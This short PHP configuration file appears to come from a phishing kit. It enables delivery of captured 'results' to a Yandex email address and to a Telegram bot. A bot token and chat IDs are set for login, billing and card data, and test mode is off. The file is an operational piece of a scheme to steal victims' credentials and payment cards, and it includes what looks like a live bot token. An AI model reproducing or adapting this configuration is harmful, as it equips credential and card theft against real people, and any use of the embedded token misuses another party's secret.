<?php

##### SETTINGS ######


# Mail RESULTS SETTINGS
$mail_sending = true;                                           # 
$rezmail = "feliksgallardo@yandex.com"; 

#TELEGRAM RESULT SETTINGS
$telegram_sending = true;                                       # 
$bot_token = "6023546165:AAE3mtkJEHsG-l6yjRquZAtjSzujhEDfvrQ";
$chat_login = "684972229";                                 # 
$chat_billing = "";                               # 
$chat_card = "";                                  # 


$test_mode = false;

?>